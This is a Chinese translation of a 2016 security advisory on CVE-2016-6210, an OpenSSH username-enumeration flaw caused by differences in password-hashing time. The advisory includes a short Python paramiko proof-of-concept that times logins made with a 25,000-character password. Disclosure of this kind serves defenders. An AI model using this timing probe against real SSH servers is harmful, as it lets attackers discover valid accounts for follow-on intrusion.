# OpenSSHD用户枚举漏洞

阅读量 **115414**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-07-19 13:58:01

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<http://seclists.org/fulldisclosure/2016/Jul/51>

译文仅供参考，具体内容表达以及含义原文为准。

**摘要:**

**通过发送一个长密码,一个远程用户可以枚举在系统上运行SSHD的用户。**

**这个问题存在于大多数的现代配置中,因为相比于计算BLOWFISH哈希散列,需要更长的时间来计算SHA256 / SHA512。** ****

**CVE-ID:CVE-2016-6210** **** ****

**  
**

**测试的版本:**

这个问题在版本opensshd – 7.2 – p2(也应该在更早期的版本上进行测试)上进行了测试。

**  
**

**修复:**

这个问题被OPENSSH的开发小组报道,而且他们已经开发出了一个修复补丁(不过目前还不知道这个补丁是否发布)。(特别感谢'dtucker () zip
com au'的快速回复和解决建议)。

**  
**

**详细信息:**

当SSHD试图验证一个不存在的用户时,它会进入一个硬编码在SSHD源代码中的假密码结构。在这个硬编码的密码结构中密码的哈希计算基于BLOWFISH
算法。如果是一个真实的有效用户密码,则会使用SHA256 / SHA512进行哈希计算。由于计算SHA256 /
SHA512哈希比计算BLOWFISH哈希耗时要长,所以如果发送的密码大于10KB,将会导致相比于不存在的用户来说收到来自服务器的响应会存在一个时间差。

**  
**

**示例代码:**

    
    
    import paramiko
    import time
    user=raw_input("user: ")
    p='A'*25000
    ssh = paramiko.SSHClient()
    starttime=time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
            ssh.connect('127.0.0.1', username=user,
            password=p)
    except:
            endtime=time.clock()
    total=endtime-starttime
    print(total)

(有效的用户将会需要更高的总时间)。

请注意,如果SSHD配置禁止root登录,那么root就不被视为有效的用户…

如果启用了TCP时间戳选项,那么度量时间的最佳方法是使用来自服务器的TCP数据包的时间戳,因为这将会消除任何网络延迟。

本文翻译自360安全播报 [原文链接](http://seclists.org/fulldisclosure/2016/Jul/51)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **mpk_no1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84232](/post/id/84232)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](http://seclists.org/fulldisclosure/2016/Jul/51)

如若转载,请注明出处： <http://seclists.org/fulldisclosure/2016/Jul/51>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t01db4a1d58aa0341cc.jpg) mpk_no1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

